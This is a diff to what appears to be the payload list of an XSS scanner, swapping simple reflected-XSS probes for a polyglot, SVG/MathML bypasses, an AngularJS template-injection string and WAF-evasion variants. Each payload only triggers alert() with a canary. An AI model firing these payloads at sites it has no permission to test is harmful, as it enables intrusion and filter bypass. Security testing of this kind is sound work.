@@ -9,23 +9,24 @@ Reflected XSS, Stored XSS probe, DOM XSS heuristics, CSRF, Open Redirect.
 XSS_CANARY = "bugxss9182736"
 
 XSS_REFLECTED = [
-    f'<script>alert("{XSS_CANARY}")</script>',
-    f'"><script>alert("{XSS_CANARY}")</script>',
-    f"'><script>alert('{XSS_CANARY}')</script>",
-    f'<img src=x onerror=alert("{XSS_CANARY}")>',
-    f'"><img src=x onerror=alert("{XSS_CANARY}")>',
-    f'<svg/onload=alert("{XSS_CANARY}")>',
-    f'"><svg/onload=alert("{XSS_CANARY}")>',
-    f'javascript:alert("{XSS_CANARY}")',
-    f'<body onload=alert("{XSS_CANARY}")>',
-    f'<<script>alert("{XSS_CANARY}")//<</script>',
-    f'<script>alert(String.fromCharCode(88,83,83))</script>',
-    f'%3cscript%3ealert%28%22{XSS_CANARY}%22%29%3c%2fscript%3e',
-    # HTML entity bypass
-    f'&lt;script&gt;alert("{XSS_CANARY}")&lt;/script&gt;',
-    # Event handlers
-    f'" onmouseover="alert(\'{XSS_CANARY}\')"',
-    f"' onmouseover='alert(`{XSS_CANARY}`)'",
+    # Basic
+    f"<script>alert('{XSS_CANARY}')</script>",
+    f"\"><img src=x onerror=alert('{XSS_CANARY}')>",
+    
+    # Advanced Polyglots
+    # Contexts: HTML, Script, Attribute
+    f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('{XSS_CANARY}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipT/--!>\\x3csVg/<sVg/oNloAd=alert('{XSS_CANARY}')//>\\x3e",
+    
+    # SVG/Math Bypass
+    f"<math><a xlink:href=\"javascript:alert('{XSS_CANARY}')\">click</a></math>",
+    f"<svg/onload=alert('{XSS_CANARY}')>",
+    
+    # AngularJS / Template Injection
+    f"{{{{constructor.constructor('alert(\"{XSS_CANARY}\")')()}}}}",
+    
+    # WAF Evasion (Capitalization & Encoding)
+    f"<%73%63%72%69%70%74>alert('{XSS_CANARY}')</%73%63%72%69%70%74>",
+    f"<ScRiPt>alert('{XSS_CANARY}')</sCrIpT>",
 ]
 
 # Payloads que sobrevivem a encodings comuns
